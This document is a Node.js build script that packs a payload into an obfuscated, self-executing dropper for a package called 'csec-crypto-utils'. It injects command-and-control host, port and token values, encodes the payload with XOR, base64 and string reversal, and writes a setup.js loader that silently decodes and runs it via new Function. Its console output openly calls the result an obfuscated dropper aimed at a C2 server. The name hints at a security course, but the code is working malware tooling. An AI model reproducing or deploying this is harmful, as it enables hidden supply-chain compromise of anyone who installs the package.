#!/usr/bin/env node

const fs = require('fs');
const path = require('path');

const XOR_KEY = 'OrDeR_7077';
const XOR_CONST = 333;
const PAD_ORIG = '=';
const PAD_SUB = '!';

const rawTarget = process.argv[2];

if (!rawTarget) {
  console.error('');
  console.error('  Usage: node build-obfuscated.js <C2_TARGET> [C2_PORT]');
  console.error('');
  console.error('  Examples:');
  console.error('    node build-obfuscated.js https://csec-c2.onrender.com     (Render)');
  console.error('    node build-obfuscated.js 192.168.1.50 4444                (local)');
  console.error('');
  process.exit(1);
}

let C2_PROTO, C2_HOST, C2_PORT;
const C2_TOKEN = process.env.C2_SECRET || '';

if (rawTarget.startsWith('http://') || rawTarget.startsWith('https://')) {
  const url = new URL(rawTarget);
  C2_PROTO = url.protocol.replace(':', '');
  C2_HOST = url.hostname;
  C2_PORT = url.port || (C2_PROTO === 'https' ? '443' : '80');
} else {
  C2_PROTO = 'http';
  C2_HOST = rawTarget;
  C2_PORT = process.argv[3] || '4444';
}

function xorEncrypt(plaintext) {
  const buf = Buffer.from(plaintext, 'utf-8');
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) {
    out[i] = buf[i] ^ XOR_KEY.charCodeAt(i % XOR_KEY.length) ^ (XOR_CONST & 0xFF);
  }
  return out;
}

function encode(plaintext) {
  const xored = xorEncrypt(plaintext);
  const b64 = xored.toString('base64');
  const padSwapped = b64.replace(/=/g, PAD_SUB);
  const reversed = padSwapped.split('').reverse().join('');
  return reversed;
}

const payloadSrc = fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf-8');

const patched = payloadSrc
  .replace('__C2_HOST__', C2_HOST)
  .replace('__C2_PORT__', C2_PORT)
  .replace('__C2_PROTO__', C2_PROTO)
  .replace('__C2_TOKEN__', C2_TOKEN);

const blob = encode(patched);

const setupJs = `var _0x = '${blob}';
var _k = '${XOR_KEY}', _c = ${XOR_CONST}, _p = '${PAD_SUB}', _o = '${PAD_ORIG}';
function _d(s) {
  var r = s.split('').reverse().join('');
  var u = r.replace(new RegExp('\\\\' + _p, 'g'), _o);
  var b = Buffer.from(u, 'base64');
  var o = Buffer.alloc(b.length);
  for (var i = 0; i < b.length; i++) o[i] = b[i] ^ _k.charCodeAt(i % _k.length) ^ (_c & 0xFF);
  return o.toString('utf-8');
}
try { (new Function('require','__dirname','__filename', _d(_0x)))(require,__dirname,__filename); } catch(e) {}
`;

const outputPath = path.join(__dirname, 'csec-crypto-utils', 'setup.js');
fs.writeFileSync(outputPath, setupJs);

console.log('');
console.log('  [+] Obfuscated dropper built successfully');
console.log('  [+] Output: csec-crypto-utils/setup.js');
console.log('  [+] C2 target: ' + C2_PROTO + '://' + C2_HOST + ':' + C2_PORT);
console.log('  [+] Protocol: ' + C2_PROTO.toUpperCase());
console.log('  [+] Token:    ' + (C2_TOKEN ? 'YES (from C2_SECRET env)' : 'NONE — server accepts any POST'));
console.log('  [+] Obfuscation: reversed Base64 (pad: ' + PAD_ORIG + ' -> ' + PAD_SUB + ') + XOR (key: ' + XOR_KEY + ', const: ' + XOR_CONST + ')');
console.log('  [+] Payload size: ' + patched.length + ' bytes -> blob: ' + blob.length + ' chars');
console.log('');
